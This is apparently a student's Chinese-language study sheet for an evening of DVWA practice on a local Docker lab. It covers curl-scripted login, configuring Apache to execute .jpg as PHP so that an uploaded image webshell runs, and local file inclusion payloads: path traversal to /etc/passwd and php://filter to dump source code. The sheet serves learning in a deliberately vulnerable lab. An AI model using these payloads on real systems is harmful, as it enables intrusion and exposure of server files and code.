# 11/22 晚上实操命令包

> 白天看这一份，把命令抄下来。
> 每条都拆开讲了它干什么、预期看到什么。
> 晚上照着敲。

---

# 第 0 步：一次性准备（5 分钟）

## 0.1 确认环境活着

```bash
cd ~/DVWA && docker compose ps
```

**看两个容器的 STATUS 都是 `Up`。**

不是的话：

```bash
docker compose up -d
```

## 0.2 登录，拿到 cookie

```bash
cd /tmp
rm -f c.txt
LT=$(curl -s -c c.txt http://127.0.0.1:4280/login.php | grep -oP "name='user_token' value='\K[^']+")
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" http://127.0.0.1:4280/login.php -o /dev/null
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=low"
echo "$CK"
```

**逐项：**

`rm -f c.txt` —— 删旧 cookie 文件。

`curl -s -c c.txt ...` —— 访问登录页，`-c` 把服务器给的 cookie 存进文件。

`| grep -oP "..."` —— 从 HTML 里抠出防跨站 token。

`-b c.txt -c c.txt` —— 带上旧 cookie、存下新 cookie。

`-d "..."` —— POST 表单数据。

`SID=$(grep PHPSESSID c.txt | awk '{print $7}')` —— cookie 文件的第 7 列就是 session id。

`CK="..."` —— 拼成能一次传两个值的 cookie 字符串（session + 难度）。

**`echo "$CK"` 必须有内容。空的就重来。**

---

# 第一部分：收尾 High（15 分钟）

## 1.1 把 jpg 加进 PHP 处理器

```bash
docker exec -i dvwa-dvwa-1 bash -c 'cat > /etc/apache2/conf-available/docker-php.conf' << 'EOF'
<FilesMatch \.(phtml|php|gif|jpg)$>
  SetHandler application/x-httpd-php
</FilesMatch>
EOF
```

**逐项：**

`docker exec -i` —— 在容器里执行，`-i` 保持标准输入打开（否则 heredoc 传不进去）。

`bash -c 'cat > 文件'` —— 让容器里的 bash 执行这条重定向。

`<< 'EOF' ... EOF` —— heredoc，把中间几行写进那个文件。

**`'EOF'` 加单引号的意思：** 里面的内容原样写入，不解释变量。不加单引号的话，`$>` 之类可能被 shell 吃掉。

## 1.2 重新加载配置

```bash
docker exec dvwa-dvwa-1 apache2ctl -k graceful
```

**预期：** 可能输出一句 `AH00558: Could not reliably determine the server's fully qualified domain name`。

**这是警告不是错误**，Apache 不知道自己域名，随口抱怨一句，不影响。

## 1.3 验证图片马执行

```bash
curl -s "http://127.0.0.1:4280/hackable/uploads/shell.jpg?c=hello"
```

**预期输出：**

```
（一大堆二进制乱码）
PWNED:hello
```

**乱码是什么：** 你那段真 JPEG 的数据（约 2.5KB），因为它在 `<?php` 前面，PHP 按文本模式原样输出。

**如果只看到 `<?php echo ...` 源码：** 说明配置没生效，重跑 1.2。

**如果看到 404：** 文件不在服务器上，回浏览器重新上传。

## 1.4 顺手确认文件还在

```bash
docker exec dvwa-dvwa-1 ls -l /var/www/html/hackable/uploads/
```

看 `shell.jpg` 的字节数应该在 2500 左右（真图片 2.5KB + php 36 字节）。

---

# 第二部分：进 File Inclusion（探索，10 分钟）

## 2.1 先看页面长什么样

浏览器打开：

```
http://127.0.0.1:4280/
```

左侧菜单点 **File Inclusion**。

**这一页会显示三个链接，类似：**

```
file1.php
file2.php
file3.php
```

点一下，看页面内容变不变。

**同时在地址栏注意 URL 变成了什么。** 大概是：

```
http://127.0.0.1:4280/vulnerabilities/fi/?page=file1.php
```

**关键：那个 `?page=` 就是漏洞点。**

## 2.2 记住三件事

**第一，参数名。** 是 `page` 还是别的。

**第二，完整路径。** 是 `/vulnerabilities/fi/` 还是别的。

**第三，页面显示什么。** 点了链接之后显示的是文件内容还是别的。

**这三样决定了后面所有命令怎么写。**

---

# 第三部分：三种 payload（30 分钟）

> 下面的命令里 `路径` 换你 2.1 看到的实际路径，`参数` 换实际参数名。

## 3.1 第一次：读系统文件

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=../../../../etc/passwd"
```

**逐项：**

`-H "Cookie: $CK"` —— 手动传 cookie，因为要同时带 session 和难度。

`?page=../../../../etc/passwd` —— 参数值。

`../` 是"上一级目录"。四个 `../` 能从 `/var/www/html/vulnerabilities/fi/` 一路退到根目录。

`/etc/passwd` 是 Linux 的用户列表，一定存在、一定可读。

**预期输出：**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**看到这些行，漏洞就确认了。**

**如果输出的是错误或者原样：** 说明 `../` 的层数不对。少一层多一层都试一下。

## 3.2 第二次：读 php 源码（关键）

先用普通方式试，**会失败**：

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=../../../../var/www/html/index.php"
```

**预期：** 输出是执行后的 HTML，**看不到源码**。

**因为 `include` 把它当代码执行了。**

现在用 `php://filter`：

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php"
```

**预期：** 输出是一大串 base64 字符（A-Z a-z 0-9 + / =），**没有 HTML 标签，没有乱码**。

**为什么这样：**

`php://filter` 让 PHP 先读源码字节，再 base64 编码，把编码结果交给 `include`。

编码后的内容是纯字母数字，没有 `<?php` 标签，所以 `include` 不执行任何东西，直接输出。

## 3.3 第三次：解开 base64

把上一步的输出存下来解码：

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

**逐项：**

`| base64 -d` —— `-d` 是 decode，把 base64 解回原始字节。

**预期：** 看到 `index.php` 的完整源码。

**你可能会看到：**

```php
<?php
if (!isset($_GET['page'])) {
    header("Location: index.php");
    exit;
}
$page = $_GET['page'];
include($page);   // ← 漏洞就在这一行
?>
```

**这一行就是漏洞的根源。**

---

# 第四部分：四个判读表

## 4.1 读 /etc/passwd

| 输出 | 说明 |
|---|---|
| `root:x:0:0:...` | 成功，漏洞确认 |
| 空白页 | 参数名或路径不对 |
| 报错 `failed to open stream` | 路径不对，但漏洞存在 |
| 原样显示 `?page=` 后面那串 | 没有 include，可能是别的问题 |

## 4.2 普通包含 php 文件

| 输出 | 说明 |
|---|---|
| 一堆 HTML | 文件被执行了，你看不到源码（正常） |
| 空白 | 执行了但没输出 |
| `<?php ...` 源码 | 这个文件没被当 php 处理（少见） |

## 4.3 php://filter

| 输出 | 说明 |
|---|---|
| 一大串 base64 | 成功 |
| 空白 | `resource=` 后面的路径不对 |
| 报错 | 过滤器名字拼错了 |

## 4.4 base64 -d 之后

| 输出 | 说明 |
|---|---|
| 能看的 php 源码 | 完全成功 |
| 乱码 | 取到的不是 php 文件，或者 base64 不完整 |

---

# 第五部分：卡住了怎么办

## 症状一：`$CK` 是空的

```bash
echo "CK=$CK"
```

空的就回第 0.2 步重来。

## 症状二：curl 返回 302

说明 cookie 无效，被跳回登录页。

```bash
curl -i -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=file1.php"
```

加 `-i` 看响应头，`Location:` 指向哪就是跳哪了。

## 症状三：`../` 一直跳不出

**先确认自己在哪一层。**

`/var/www/html/vulnerabilities/fi/` 到根目录需要 4 层：

```
fi/ → vulnerabilities/ → html/ → www/ → var/ → 根
     1层              2层       3层     4层
```

**算错了就多试几个，三个、四个、五个都试一遍。**

## 症状四：File Inclusion 页面没有 file1.php 链接

**那说明 DVWA 没初始化。**

左侧 **Setup / Reset DB** → 点 **Create / Reset Database**。

---

# 附：时间表

| 时间 | 做什么 |
|---|---|
| 18:00-19:30 | 学校（作业 + 抄形考清单） |
| 19:30-19:45 | 第 0 步准备 |
| 19:45-20:00 | 第一部分收尾 High |
| 20:00-20:15 | 第二部分探索 File Inclusion |
| 20:15-20:45 | 第三部分三种 payload |
| 20:45-21:00 | 记三行结论 |
| 21:00 之后 | 想继续就深挖，不想就收工 |

---

# 附：明天要记的三行

一，图片马执行的响应里，乱码是什么

二，`include` 直接包含 php 文件时，为什么看不到源码

三，`php://filter` 让源码变成 base64，为什么就不执行了
